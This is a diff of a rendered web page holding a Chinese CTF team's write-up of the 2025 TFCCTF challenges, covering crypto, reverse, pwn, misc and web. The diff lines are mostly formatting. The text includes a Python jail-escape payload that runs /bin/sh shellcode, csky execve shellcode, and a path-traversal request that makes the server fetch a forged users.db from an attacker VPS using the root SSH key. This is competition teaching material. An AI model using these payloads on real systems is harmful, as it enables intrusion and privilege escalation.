@@ -2,7 +2,7 @@
 
 <!DOCTYPE html>
 <html lang="en" itemscope itemtype="http://schema.org/WebPage">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
 
   <meta charset="utf-8" />
@@ -14,7 +14,8 @@
 
       <title>2025 TFCCTF SU WriteUp - su-team</title>
 
-  <meta name="description" content="本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
+  <meta name="description" content="本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com
+ 或者直接联系baozongwi QQ:2405758945。
 以下是我们 SU 本次 2025 TFCCTF的 WriteUp。">
   <meta name="author" content="SUer"/><script type="application/ld+json">
 {
@@ -66,7 +67,7 @@
   "headline": "2025 TFCCTF SU WriteUp",
   "description" : "本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。\n以下是我们 SU 本次 2025 TFCCTF的 WriteUp。\n",
   "inLanguage" : "en",
-  "wordCount":  9696 ,
+  "wordCount":  9697 ,
   "datePublished" : "2025-08-31T21:31:50\u002b08:00",
   "dateModified" : "2025-08-31T21:31:50\u002b08:00",
   "image" : "http:\/\/localhost:1313\/img\/SU.jpg",
@@ -87,7 +88,8 @@
 
 
 <meta property="og:title" content="2025 TFCCTF SU WriteUp" />
-<meta property="og:description" content="本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
+<meta property="og:description" content="本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com
+ 或者直接联系baozongwi QQ:2405758945。
 以下是我们 SU 本次 2025 TFCCTF的 WriteUp。">
 <meta property="og:image" content="http://localhost:1313/img/SU.jpg" />
 <meta property="og:url" content="http://localhost:1313/post/tfcctf-2025-su-wu/" />
@@ -95,7 +97,8 @@
 <meta property="og:site_name" content="su-team" />
 
   <meta name="twitter:title" content="2025 TFCCTF SU WriteUp" />
-  <meta name="twitter:description" content="本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
+  <meta name="twitter:description" content="本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com
+ 或者直接联系baozongwi QQ:2405758945。
 以下是我们 SU 本次 2025 TFCCTF的 WriteUp。">
   <meta name="twitter:image" content="http://localhost:1313/img/SU.jpg" />
   <meta name="twitter:card" content="summary_large_image" />
@@ -319,7 +322,7 @@
     &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;46&nbsp;min
   
   
-    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;9696&nbsp;words
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;9697&nbsp;words
   
   
     
@@ -401,9 +404,15 @@
 
         <section class="article-shell">
           <article role="main" class="blog-post">
-            <p>本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_<a href="mailto:xctf@126.com">xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p>
+            <p>本次 TFCCTF 我们 SU 取得了 第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_<a href="mailto:xctf@126.com">xctf@126.com</a>
+ 或者直接联系baozongwi QQ:2405758945。</p>
 <p>以下是我们 SU 本次 2025 TFCCTF的 WriteUp。</p>
-<p><img src="/img/2025-TFCCTF/1.png" alt="img"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/1.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <h1 id="crypto">Crypto</h1>
 <h2 id="deez-errors">DEEZ ERRORS</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span><span class="p">,</span> <span class="n">bytes_to_long</span>  
@@ -519,7 +528,8 @@ $$
 d^{-1}\pmb{b}'=d^{-1}\pmb{A}\pmb{s}+\pmb{\varepsilon}.
 $$
 </div>
-<p>因为 $\pmb{s}$ 较大，所以需要使用 <a href="https://triodelzx.github.io/2025/07/07/LWE/">LWE | Triode Field</a> 中提到的先求 HNF 再进行规约的方法。</p>
+<p>因为 $\pmb{s}$ 较大，所以需要使用 <a href="https://triodelzx.github.io/2025/07/07/LWE/">LWE | Triode Field</a>
+ 中提到的先求 HNF 再进行规约的方法。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># sage 10.4</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">choices</span>
@@ -566,7 +576,8 @@ $$
 </span></span></code></pre></div><h2 id="mini-aura">MINI AURA</h2>
 <p>csky架构最后发现只有ghidra反编译比较成功</p>
 <p>需要安装ghidra插件</p>
-<p><a href="https://github.com/leommxj/ghidra_csky">https://github.com/leommxj/ghidra_csky</a></p>
+<p><a href="https://github.com/leommxj/ghidra_csky">https://github.com/leommxj/ghidra_csky</a>
+</p>
 <p>反编译完直接就跳到了main而且非常清晰</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
@@ -1010,7 +1021,12 @@ $$
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./flag.txt&#34;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span></span></code></pre></div><p><img src="/img/2025-TFCCTF/2.png" alt="1"></p>
+</span></span></code></pre></div><p><img
+  src="/post/tfcctf-2025-su-wu/2.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>再分别求解系数方程就可以得到flag：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
 </span></span><span class="line"><span class="cl">
@@ -1089,9 +1105,16 @@ $$
 <p>通过查看random.choices()这个函数，发现该函数会调用<code>floor(random() * n)</code>这个函数对这选择<code>0~2^26</code>这个列表中的一个数据，而<code>0~2^26</code>这个列表是按顺序排列的。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">return</span> <span class="p">[</span><span class="n">population</span><span class="p">[</span><span class="n">floor</span><span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="n">n</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">_repeat</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">k</span><span class="p">)]</span>
 </span></span></code></pre></div><p>所以选择choice为1的时候本质上就是获得floor(random() * n)的值，接下来就需要看random()这个函数是如何生成随机数的。而Python的随机数模块使用的是MT19937算法，所以此题考察的就是MT19937算法的预测或者恢复（预测或者恢复主要是看输入choice为2的时机）。</p>
-<p>通过询问AI得知，Python的random模块有些是直接使用C语言实现的，这些用C语言实现的随机数函数在编译Python解释器的时候已经被编译了，题目中的random()这个函数就是C语言实现的。所以需要到CPython相关的github仓库查看一下源码。在CPython中的这个仓库中可以找到源码 <a href="https://github.com/python/cpython/blob/main/Modules/_randommodule.c">https://github.com/python/cpython/blob/main/Modules/_randommodule.c</a></p>
-<p><img src="/img/2025-TFCCTF/3.png" alt="1"></p>
-<p>从源码中就可以看到random()在生成的时候相当于调用了俩次random.randbytes(32)，其中a取高27位，b取高26位。总的来说choice选择1，得到的就是floor(random() * n)的值，也就是能得到MT19937的26bit的值，但是连续选择choice1得到的26bit并不是连续的。对于已知不连续的nbit的值，本质上是线性方程组求解，求解的原理在这篇文章中情况三有比较详细的说明<a href="https://xenny.wiki/posts/crypto/PRNG/MT19937.html">MT19937分析</a>，同时这篇博客有类似的题型https://tangcuxiaojikuai.xyz/post/69eaef2e.html</p>
+<p>通过询问AI得知，Python的random模块有些是直接使用C语言实现的，这些用C语言实现的随机数函数在编译Python解释器的时候已经被编译了，题目中的random()这个函数就是C语言实现的。所以需要到CPython相关的github仓库查看一下源码。在CPython中的这个仓库中可以找到源码 <a href="https://github.com/python/cpython/blob/main/Modules/_randommodule.c">https://github.com/python/cpython/blob/main/Modules/_randommodule.c</a>
+</p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/3.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
+<p>从源码中就可以看到random()在生成的时候相当于调用了俩次random.randbytes(32)，其中a取高27位，b取高26位。总的来说choice选择1，得到的就是floor(random() * n)的值，也就是能得到MT19937的26bit的值，但是连续选择choice1得到的26bit并不是连续的。对于已知不连续的nbit的值，本质上是线性方程组求解，求解的原理在这篇文章中情况三有比较详细的说明<a href="https://xenny.wiki/posts/crypto/PRNG/MT19937.html">MT19937分析</a>
+，同时这篇博客有类似的题型https://tangcuxiaojikuai.xyz/post/69eaef2e.html</p>
 <p>得到思路后就可以先使用脚本收集足够的数据以及密文，对于MT19937一般题型来说只需要泄露19968位数就能得到MT19937的624个状态，但是线性方程组求解使用19968位解出一般是解不出来正确结果。需要得到更多的位数。（本题测试可知已知32000位数是能得到准确的624个状态的）</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
@@ -1310,15 +1333,22 @@ $$
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h2 id="mucusky">MUCUSKY</h2>
 <p>下载一个ghida插件</p>
-<p><a href="https://github.com/leommxj/ghidra_csky">https://github.com/leommxj/ghidra_csky</a></p>
+<p><a href="https://github.com/leommxj/ghidra_csky">https://github.com/leommxj/ghidra_csky</a>
+</p>
 <p>栈溢出</p>
-<p><img src="/img/2025-TFCCTF/4.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/4.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>后面就是 调试工具了可以从这里下载到</p>
-<p><a href="https://gitee.com/swxu/csky-elfabiv2-tools">https://gitee.com/swxu/csky-elfabiv2-tools</a></p>
+<p><a href="https://gitee.com/swxu/csky-elfabiv2-tools">https://gitee.com/swxu/csky-elfabiv2-tools</a>
+</p>
 <p>后面经过测试发现 stack 地址 貌似是固定的</p>
 <p>然后 ret2shellcode</p>
 <p>要注意的是 有些字符不能发送，不然会截断？</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">!</span><span class="p">[</span><span class="mi">5</span><span class="p">](</span><span class="o">/</span><span class="n">img</span><span class="o">/</span><span class="mi">2025</span><span class="o">-</span><span class="n">TFCCTF</span><span class="o">/</span><span class="mf">5.</span><span class="n">png</span><span class="p">)</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">!</span><span class="p">[</span><span class="mi">5</span><span class="p">](</span><span class="mf">5.</span><span class="n">png</span><span class="p">)</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#from ctypes import CDLL</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
@@ -1372,16 +1402,32 @@ $$
 <li>构造shellcode，由于不太清楚这个架构的 系统调用号</li>
 </ul>
 <p>Elf 里面的 read 系统调用号是 0x54</p>
-<p><img src="/img/2025-TFCCTF/5.png" alt="1"></p>
-<p>而 linux 源码里面的是 64 <a href="https://github.com/c-sky/linux-4.9.y">https://github.com/c-sky/linux-4.9.y</a></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/5.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
+<p>而 linux 源码里面的是 64 <a href="https://github.com/c-sky/linux-4.9.y">https://github.com/c-sky/linux-4.9.y</a>
+</p>
 <p>&gt;&raquo; 0x54-63</p>
 <p>21</p>
 <p>相差21</p>
-<p><img src="/img/2025-TFCCTF/6.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/6.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>那么 正确的 execve调用号 可能也是 差 21</p>
 <p>&gt;&raquo; 221+21</p>
 <p>242</p>
-<p><img src="/img/2025-TFCCTF/7.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/7.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="o">.</span><span class="n">section</span> <span class="o">.</span><span class="n">text</span>
 </span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="n">globl</span> <span class="n">_start</span>
 </span></span><span class="line"><span class="cl"><span class="n">_start</span><span class="p">:</span>
@@ -1392,8 +1438,18 @@ $$
 </span></span><span class="line"><span class="cl">    <span class="n">movi</span> <span class="n">r0</span><span class="p">,</span><span class="mh">0xf2</span> <span class="p">;</span><span class="mi">242</span> <span class="n">execve</span>
 </span></span><span class="line"><span class="cl">    <span class="n">movi</span> <span class="n">r12</span><span class="p">,</span><span class="mh">0x8310</span> <span class="p">;</span> <span class="n">syscall</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">    <span class="n">jmp</span> <span class="n">r12</span>
-</span></span></code></pre></div><p><img src="/img/2025-TFCCTF/8.png" alt="1"></p>
-<p><img src="/img/2025-TFCCTF/9.png" alt="1"></p>
+</span></span></code></pre></div><p><img
+  src="/post/tfcctf-2025-su-wu/8.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/9.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <h1 id="misc">Misc</h1>
 <h2 id="minijail">MINIJAIL</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="w"> </span><span class="s">ubuntu:20.04</span><span class="err">
@@ -1696,12 +1752,18 @@ $$
 </span></span><span class="line"><span class="cl">TID      Uid<span class="o">(</span>R/E/S<span class="o">)</span>   Gid<span class="o">(</span>R/E/S<span class="o">)</span>   State    Comm
 </span></span><span class="line"><span class="cl"><span class="m">522</span>      0/0/0        65534/65534/65534 S <span class="o">(</span>sleeping<span class="o">)</span> python3
 </span></span><span class="line"><span class="cl"><span class="m">523</span>      65534/65534/65534 65534/65534/65534 S <span class="o">(</span>sleeping<span class="o">)</span> Thread-1 <span class="o">(</span>safe_
-</span></span></code></pre></div><p>同一进程不同线程用shellcode打 <a href="https://ewontfix.com/17/#:~:text=Now">https://ewontfix.com/17/#:~:text=Now</a></p>
+</span></span></code></pre></div><p>同一进程不同线程用shellcode打 <a href="https://ewontfix.com/17/#:~:text=Now">https://ewontfix.com/17/#:~:text=Now</a>
+</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">()</span>.__class__.__base__.__subclasses__<span class="o">()[</span>166<span class="o">]</span>.__init__.__globals__<span class="o">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="o">][</span><span class="s1">&#39;exec&#39;</span><span class="o">](</span><span class="s2">&#34;ctypes=__import__(&#39;ctypes&#39;);m=__import__(&#39;o&#39;+&#39;s&#39;);libc=ctypes.CDLL(None);PROT_READ,PROT_WRITE,PROT_EXEC=1,2,4;MAP_PRIVATE,MAP_ANONYMOUS=2,32;SIGUSR1=10;SYS_TGKILL=234;size=0x1000;mm=libc.mmap;mm.restype=ctypes.c_void_p;addr=mm(0,size,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);sc=b&#39;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&#39;;ctypes.memmove(addr,sc,len(sc));CB=ctypes.CFUNCTYPE(None,ctypes.c_int);handler=ctypes.cast(addr,CB);libc.signal.argtypes=(ctypes.c_int,CB);libc.signal.restype=CB;libc.signal(SIGUSR1,handler);pid=m.getpid();libc.syscall(SYS_TGKILL,pid,pid,SIGUSR1)&#34;</span>,<span class="o">()</span>.__class__.__base__.__subclasses__<span class="o">()[</span>166<span class="o">]</span>.__init__.__globals__<span class="o">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="o">])</span>
 </span></span></code></pre></div><h2 id="discord-shenanigans-v5">DISCORD SHENANIGANS V5</h2>
 <p>根据题目描述，确定在dc的官方频道的announcement处藏了东西</p>
 <p>所以直接将当时有的一些记录复制到notepad，发现其中一条信息后有奇怪的内容</p>
-<p><img src="/img/2025-TFCCTF/10.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/10.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>推测应该是零宽字节隐写，这里丢给厨子可以看到只有两种零宽字节，用在线工具处理不出来</p>
 <p>gpt搞个脚本解析一下即可</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
@@ -1731,7 +1793,12 @@ $$
 <p>ida没办法直接解析反汇编成伪代码</p>
 <p>但由于这固件内容不多，可以直接分析有的内容，发现sub_BE是核心代码</p>
 <p>ai分析发现是进行了简单的异或加密，异或0xa5，但是不确定密文的位置在哪里，直接把整个elf文件作为输入丢给赛博厨子，然后得到flag</p>
-<p><img src="/img/2025-TFCCTF/11.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/11.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <h2 id="cr00ney">CR00NEY</h2>
 <p>题目附件代码看起来比较多, 但是关键逻辑就几点</p>
 <ol>
@@ -1747,7 +1814,12 @@ $$
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">NextResponse</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">flag</span> <span class="p">});</span>
 </span></span></code></pre></div><p>需要admin字段鉴权以确定是都能拿到flag, 去看users表结构</p>
-<p><img src="/img/2025-TFCCTF/12.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/12.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>再看注册逻辑</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">export</span> <span class="kr">async</span> <span class="kd">function</span> <span class="nx">POST</span><span class="p">(</span><span class="nx">request</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span> <span class="p">}</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">request</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
@@ -1965,7 +2037,12 @@ $$
 </span></span></code></pre></div><p>需要安装paramiko依赖</p>
 <p>有点小bug, 要把事先准备好的users.db放在<code>/app/app/</code>目录下</p>
 <p>然而直接覆盖users.db也不行, 题目对users.db进行了校验</p>
-<p><img src="/img/2025-TFCCTF/13.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/13.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>依旧是ai生成脚本来修改获得恶意users.db, 使得它通过DB_id校验</p>
 <p><code>message.py</code>如下</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
@@ -2224,7 +2301,12 @@ $$
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;host&#34;</span><span class="p">:</span><span class="s2">&#34;vps_ip&#34;</span><span class="p">,</span><span class="nt">&#34;filename&#34;</span><span class="p">:</span><span class="s2">&#34;../users.db&#34;</span><span class="p">,</span><span class="nt">&#34;keyPath&#34;</span><span class="p">:</span><span class="s2">&#34;/root/.ssh/id_rsa&#34;</span><span class="p">,</span><span class="nt">&#34;downloadPath&#34;</span><span class="p">:</span><span class="s2">&#34;/app/downloads/&#34;</span><span class="p">}</span>
 </span></span></code></pre></div><p>服务器收到请求</p>
-<p><img src="/img/2025-TFCCTF/14.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/14.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>此时qqq账户已经是admin权限</p>
 <p>访问<code>/api/admin</code>即得flag</p>
 <h2 id="to-rotate-or-not-to-rotate">TO ROTATE, OR NOT TO ROTATE</h2>
@@ -2688,7 +2770,12 @@ $$
 </span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">LABEL_38</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span></code></pre></div><p>直接nop掉跳转即可</p>
-<p><img src="/img/2025-TFCCTF/15.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/15.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>然后apply patches</p>
 <p>接下来需要做的是把新的so重新打包回去，这里需要借助apktool</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">apktool</span> <span class="n">d</span> <span class="n">app</span><span class="o">-</span><span class="n">release</span><span class="p">.</span><span class="n">apk</span> <span class="o">-</span><span class="n">o</span> <span class="n">app</span><span class="o">-</span><span class="n">src</span>
@@ -2709,7 +2796,8 @@ $$
 </span></span><span class="line"><span class="cl">08-30 00:01:09.162 12473 12473 D OXI     : FLAG=TFCCTF{167e3ce3c65387c6e981c31c39ac7839}
 </span></span></code></pre></div><h2 id="scratching-machine">SCRATCHING MACHINE</h2>
 <p>很复杂的积木语言题scratch，碰到这种直接用工具即可</p>
-<p><a href="https://github.com/BirdLogics/sb3topy">https://github.com/BirdLogics/sb3topy</a></p>
+<p><a href="https://github.com/BirdLogics/sb3topy">https://github.com/BirdLogics/sb3topy</a>
+</p>
 <p>转成python直接喂给ai写脚本，代码很长不放了，用上面的工具输出应该都一样，直接给出解密脚本</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 从原始代码中复制的 cacamaca 列表</span>
 </span></span><span class="line"><span class="cl"><span class="n">cacamaca</span> <span class="o">=</span> <span class="p">[</span>
@@ -2758,9 +2846,19 @@ $$
 <p>法一：动态调试</p>
 <p>得到o文件后ida分析找check_flag等函数，结合wat代码可以发现data 1049113位置处有特殊字符串<code>C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDFcheia_osc_plugenc</code></p>
 <p>在c代码中发现比较点，可以看到后面有wrong、correct</p>
-<p><img src="/img/2025-TFCCTF/16.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/16.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>回到浏览器里源代码wasm搜1049113（此时已经转为了wat代码，还是可以读的）下断点</p>
-<p><img src="/img/2025-TFCCTF/17.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/17.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>输入框输入6个a结果发现没有断下来，说明压根没有到比较点（下断点在encrypt等同样发现没有被调用）</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Thrift" data-lang="Thrift"><span class="line"><span class="cl"><span class="w">                </span><span class="n">local.get</span><span class="w"> </span><span class="err">$</span><span class="n">var2</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">i32</span><span class="err">.</span><span class="n">load</span><span class="w"> </span><span class="n">offset</span><span class="o">=</span><span class="mi">36</span><span class="w">
@@ -2776,13 +2874,28 @@ $$
 </span></span></span><span class="line"><span class="cl"><span class="w">                  </span><span class="n">local.set</span><span class="w"> </span><span class="err">$</span><span class="n">var1</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">                  </span><span class="kt">i32</span><span class="err">.</span><span class="kd">const</span><span class="w"> </span><span class="mi">1049113</span><span class="w">
 </span></span></span></code></pre></div><p>从1049113往上找发现一处if比较，可以在local.get $var2下断点发现此时可以断下来，说明我们没有进到这个if</p>
-<p><img src="/img/2025-TFCCTF/18.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/18.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>调试发现比较12和134，12正好是我们输入的6个a的16进制长度；134同样也是<code>C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDF</code></p>
 <p>因此可知输入应该是67位，直接怼a*67进去看比较点</p>
 <p>点击下图里的内存可以查看值</p>
-<p><img src="/img/2025-TFCCTF/19.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/19.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>调试到下图时候看到给了一个比较大的地址，查看内存发现正好是输入加密完的结果</p>
-<p><img src="/img/2025-TFCCTF/20.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/20.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>结合前面obf_key长度14（<code>cheia_osc_plug</code>，check_flag开头有一组while循环14次，按模3结果处理了key），观察发现这个组16进制值出现了循环，因此直接猜测只做了简单的异或，我们要做的只需要提取出来异或的值即可</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">xor</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;e1cfc4e8f9fdedc9f91bc3ffe0fd&#34;</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">xor</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="o">^</span><span class="mi">97</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xor</span><span class="p">]</span>
@@ -2894,7 +3007,12 @@ $$
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 </span></span></code></pre></div><h2 id="font-leagues">FONT LEAGUES</h2>
 <p>验证端口告诉我们输入正确的flag会变成O，那么下载FontForge找到唯一的O</p>
-<p><img src="/img/2025-TFCCTF/21.png" alt="1"></p>
+<p><img
+  src="/post/tfcctf-2025-su-wu/21.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>O162e219bca79a462f9cf5701124cf74c</p>
 <p>然后写一个映射表的代码</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fontTools.ttLib</span> <span class="kn">import</span> <span class="n">TTFont</span>
@@ -3157,14 +3275,17 @@ $$
